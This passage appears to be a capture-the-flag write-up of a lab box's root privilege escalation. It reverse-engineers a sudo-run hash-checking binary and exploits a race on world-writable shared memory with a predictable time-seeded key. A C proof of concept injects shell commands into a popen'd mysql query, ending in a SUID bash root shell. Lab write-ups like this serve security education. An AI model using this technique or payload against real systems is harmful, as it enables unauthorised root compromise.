reader@checker:~$ ls -la
total 36
drwxr-x--- 4 reader reader 4096 Feb 24 15:37 .
drwxr-xr-x 3 root   root   4096 Jun 12  2024 ..
lrwxrwxrwx 1 root   root      9 Feb  6 04:07 .bash_history -> /dev/null
-rw-r--r-- 1 reader reader  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 reader reader 3771 Jan  6  2022 .bashrc
drwx------ 2 reader reader 4096 Jun 15  2024 .cache
-r-------- 1 reader reader   39 Jun 14  2024 .google_authenticator
drwxrwxr-x 3 reader reader 4096 Jun 15  2024 .local
-rw-r--r-- 1 reader reader  807 Jan  6  2022 .profile
-rw-r----- 1 root   reader   33 Jun 12  2024 user.txt

```

#### sudo

reader is able to run `/opt/hash-checker/check-leak.sh` with arguments as root without a password:

```

reader@checker:~$ sudo -l
Matching Defaults entries for reader on checker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *

```

#### /opt/hash-checker

`/opt/hash-checker` contains five files:

```

reader@checker:/opt/hash-checker$ ls -la
total 68
drwxr-xr-x 2 root root  4096 Jan 30 17:09 .
drwxr-xr-x 5 root root  4096 Jan 30 17:04 ..
-r-------- 1 root root   118 Jan 30 17:07 .env
-rwxr--r-- 1 root root   141 Jan 30 17:04 check-leak.sh
-rwxr--r-- 1 root root 42376 Jan 30 17:02 check_leak
-rwx------ 1 root root   750 Jan 30 17:07 cleanup.sh
-rw-r--r-- 1 root root  1464 Jan 30 17:09 leaked_hashes.txt

```

The `.env` file will likely have the environment variables for the run, but it can’t be read by reader. Similarly, `cleanup.sh` can’t be read.

`leaked_hashes.txt` has 24 bcrypt hashes:

```

reader@checker:/opt/hash-checker$ wc -l leaked_hashes.txt 
24 leaked_hashes.txt
reader@checker:/opt/hash-checker$ cat leaked_hashes.txt
$2b$10$rbzaxiT.zUi.e28wm2ja8OGx.jNamreNFQC6Kh/LeHufCmduH8lvy
$2b$10$Tkd9LwWOOzR.DWdzj9aSp.Bh.zQnxZahKel4xMjxLIHzdostFVqsK
$2b$10$a/lpwbKF6pyAWeGHCVARz.JOi3xtNzGK..GZON/cFhNi1eyMi4UIC
$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
$2b$10$DanymKXfnu1ZTrRh3JwBhuPsmjgOEBJLNEEmLPAAIfG9kiOI28fIC
$2b$10$/GwrAIQczda3O5.rnGb4IOqEE/JMU4TIcy95ECSh/pZBQzhlWITQ.
$2b$10$Ef6TBE9GdSsjUPwjm0NYlurGfVO/GdtaCsWBpVRPnQsCbYgf4oU8a
$2b$10$/KLwuhoXHfyKpq1qj8BDcuzNyhR0h0g27jl0yiX7BpBL9kO.wFWii
$2b$10$Ito9FRIN9DgMHWn20Zgfa.yKKlJ.HedScxyvymCxMYTWaZANHIzvO
$2b$10$J025XtUSjTm.kUfa19.6geInkfiISIjkr7unHxT4V/XDIl.2LYrZ2
$2b$10$g962m7.wovzDRPI/4l0GEOviIs2WUPBqlkPgVAPfsYpa138dd9aYK
$2b$10$keolOsecWXEyDIN/zDPVbuc/UOjGjnZGblpdBPQAfZDVm2fRIDUCq
$2b$10$y2Toog209OyRWk6z7S7XNOAkVBijv3HwNBpKk.R1bPCYuR8WxrL66
$2b$10$O4OQizv0TVsWxWi26tg8Xu3SCS29ZEv9JqwlY5ED240qW8V0eyG7a
$2b$10$/1ePaOFZrcpNHWFk72ZNpepXRvXIi1zMSBYBGGqxfUlxw/JiQQvCG
$2b$10$/0az8KLoanuz3rfiN.Ck9./Mt6IHxs5OGtKbgM31Z0NH9maz1hPDe
$2b$10$VGR3JK.E0Cc3OnY9FuB.u.qmwFBBRCrRLAvUlPnO5QW5SpD1tEeDO
$2b$10$9p/iOwsybwutYoL3xc5jaeCmYu7sffW/oDq3mpCUf4NSZtq2CXPYC
$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
$2b$10$8cXny33Ok0hbi2IY46gjJerQkEgKj.x1JJ6/orCvYdif07/tD8dUK
$2b$10$QAcqcdyu1T1qcpM4ZQeM6uJ3dXw2eqT/lUUGZvNXzhYqcEEuwHrvS
$2b$10$M1VMeJrjgaIbz2g2TCm/ou2srr4cd3c18gxLA32NhvpXwxo3P5DZW
$2b$10$rxp3yM98.NcbD3NeHLjGUujzIEWYJ5kiSynHOHo0JvUvXq6cBLuRO
$2b$10$ZOUUTIj7JoIMwoKsXVOsdOkTzKgHngBCqkt.ASKf78NUwfeIB4glK

```

`check-leak.sh` is a simple Bash script:

```

reader@checker:/opt/hash-checker$ cat check-leak.sh 
#!/bin/bash
source `dirname $0`/.env
USER_NAME=$(/usr/bin/echo "$1" | /usr/bin/tr -dc '[:alnum:]')
/opt/hash-checker/check_leak "$USER_NAME"

```

It loads the environment variables from `.env` in the same directory as the script. It sanitizes the first argument by removing any non-alphanumeric characters and storing that as the `USER_NAME`. Then it calls `/opt/hash-checker/check_leak` with the `USER_NAME` as the argument.

### check\_leak

#### Run It

Only root can run `check_leak` currently. I can make a copy and run it as reader:

```

reader@checker:/opt/hash-checker$ cp check_leak /tmp/
reader@checker:/opt/hash-checker$ /tmp/check_leak 
Error: Missing database credentials in environment

```

It’s trying to make a DB connection.

I’ll run it with `sudo`:

```

reader@checker:/opt/hash-checker$ sudo /opt/hash-checker/check-leak.sh
Error: <USER> is not provided.
reader@checker:/opt/hash-checker$ sudo /opt/hash-checker/check-leak.sh reader
User not found in the database.
reader@checker:/opt/hash-checker$ sudo /opt/hash-checker/check-leak.sh admin
User is safe.
reader@checker:/opt/hash-checker$ sudo /opt/hash-checker/check-leak.sh bob
Password is leaked!
Using the shared memory 0xA097B as temp location
User will be notified via bob@checker.htb

```

It seems that the options are that the user is not in the DB, that the user is safe, or that the user’s password has leaked. I can guess that it’s doing some comparison between the user’s hash and the hashes in the txt file.

The use of shared memory is interesting, and something I’ll exploit.

#### main

I’ll copy the binary back to my host and open it in Ghidra. The main function gets the variables from the environment:

```

  DB_HOST = getenv("DB_HOST");
  DB_USER = getenv("DB_USER");
  DB_PASSWORD = getenv("DB_PASSWORD");
  DB_NAME = getenv("DB_NAME");

```

It validates that the argument (the username) is 20 or less characters and exists before calling `fetch_hash_from_db`:

```

hash = fetch_hash_from_db(DB_HOST,DB_USER,DB_PASSWORD,DB_NAME,hash);

```

This function returns a hash from the database associated with the username. If it is empty (the user doesn’t exist), it prints that. Otherwise, it calls another function, and processes the result:

```

        hash_in_file = check_bcrypt_in_file("/opt/hash-checker/leaked_hashes.txt",hash);
        if ((char)hash_in_file == '\0') {
          puts("User is safe.");
        }
        else {
          puts("Password is leaked!");
          if (DAT_8001913c != '\0') {
            __asan_report_load8(&stdout);
          }
          fflush(stdout);
          shm_key = write_to_shm(hash);
          printf("Using the shared memory 0x%X as temp location\n",shm_key);
          if (DAT_8001913c != '\0') {
            __asan_report_load8(&stdout);
          }
          fflush(stdout);
          sleep(1);
          notify_user(DB_HOST,DB_USER,DB_PASSWORD,DB_NAME,shm_key);
          clear_shared_memory(shm_key);
        }
        free(hash);

```

If the function returns false, then it prints that the user is safe. Otherwise, it prints the “Password is leaked” message, and then processes it, first by calling `write_to_shm`. Then the result from that call is printed and passed to `notify_user` *after* a one second sleep. Then `clear_shared_memory` is called.

#### write\_to\_shm

`write_to_shm` seeds and calls `rand` to get a random key, and then uses that to call `shmget`, fetching a space in shared memory:

```

  now_stamp = time((time_t *)0x0);
  srand((uint)now_stamp);
  key = rand();
  shmid = shmget(key % 0xfffff,0x400,0x3b6);

```

It gets a handle to that space:

```

h_shm = (char *)shmat(shmid,(void *)0x0,0);

```

And later writes a message into the memory and detaches:

```

  snprintf(h_shm,0x400,"Leaked hash detected at %s > %s\n",timestamp,hash);
  shmdt(h_shm);

```

#### notify\_user

`notify_user` takes the key and uses it with `shmget` and then `shmat` to get access to the same shared memory space.

It first finds the string “Leaked hash detected” and then the “>” character:

```

      str = strstr(h_shm,"Leaked hash detected");
      if (str == (char *)0x0) {
        puts("No hash detected in shared memory.");
      }
      else {
        str = strchr(str,L'>');
        if (str == (char *)0x0) {
          puts("Malformed data in the shared memory.");
        }
        else {

```

Then it calls `trim_bcrypt_hash`, which returns just the hash after the “>”. It creates memory to hold a `mysql` command, and then writes that command to it:

```

          str = trim_bcrypt_hash(str + 1);
          resp = setenv("MYSQL_PWD",DB_PASS,1);
          if (resp == 0) {
            resp = snprintf((char *)0x0,0,
                            "mysql -u %s -D %s -s -N -e \'select email from teampass_users where pw = \"%s\"\'"
                            ,DB_USER,DB_NAME,str);
            cmd_buffer = (char *)malloc((long)(resp + 1));
            if (cmd_buffer == (char *)0x0) {
              puts("Failed to allocate memory for command");
              shmdt(h_shm);
              bVar4 = false;
            }
            else {
              snprintf(cmd_buffer,(long)(resp + 1),
                       "mysql -u %s -D %s -s -N -e \'select email from teampass_users where pw = \"% s\"\'"
                       ,DB_USER,DB_NAME,str);
              __stream = popen(cmd_buffer,"r");

```

Then it runs the command with `popen`.

### Exploit

#### Strategy

The program writes a string to a shared memory buffer, sleeps for one second, and then uses that buffer to craft a command sent to `popen`. If I can change that memory, I can command inject to run arbitrary commands as root.

I’ll note that when the shared memory is requested, it uses the flags 0x3b6, which is 0o1666:

```

>>> oct(0x3b6)
'0o1666'

```

That’s writable by any user.

#### POC

I’ll write a program in C that will seed the random number generator the same way that `check_leak` does, and generate the same random number, and write a command injection payload into the file.

```

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/shm.h>

int main() {
    time_t now = (unsigned int) time(NULL);
    srand(now);
    int key = rand() % 0xfffff;
    int shmid = shmget(key, 0x400, 0x3b6);
    char *h_shm = shmat(shmid, (void *) 0, 0);
    snprintf(h_shm, 0x400, "Leaked hash detected at whenever > '; touch /tmp/0xdf;#");
    shmdt(h_shm);
}

```

This program will seed the random number generator and get a random five digit key, just like the program data. It will then open shared memory with that key and attach. I didn’t include the error handling as I’m just hacking here.

It then writes my malicious string into shared memory, so that when it’s read, it runs the SQL query, exits, and runs my command.

I’ll upload this to Checker, compile it, and then run it in a loop, poisoning continuously the shared memory for the random number of the current timestamp:

```

reader@checker:/tmp$ nano d.c 
reader@checker:/tmp$ gcc d.c -o d
reader@checker:/tmp$ while true; do ./d ; done

```

In a second SSH terminal, I’ll run the command to check bob, which has a leaked hash.

```

reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
Password is leaked!
Using the shared memory 0x6ADF0 as temp location
ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"' at line 1
Failed to read result from the db

```

There’s an SQL error, which is due to my injection! More interestingly, there’s now a `/tmp/0xdf` file owned by root:

```

reader@checker:~$ ls -l /tmp/0xdf 
-rw-r--r-- 1 root root 0 Feb 24 19:32 /tmp/0xdf

```

#### Shell

I’ll update my code with a new payload to make a SetUID/SetGID `bash`:

```

    snprintf(h_shm, 0x400, "Leaked hash detected at whenever > '; cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf;#");

```

On running again, it works:

```

reader@checker:~$ ls -l /tmp/0xdf 
-rwsrwsrwx 1 root root 1396520 Feb 24 19:34 /tmp/0xdf

```

Running it with `-p` returns a root shell:

```

reader@checker:~$ /tmp/0xdf -p
0xdf-5.1# 

```

And the root flag:

```

0xdf-5.1# cat root.txt
2226b8ab************************

```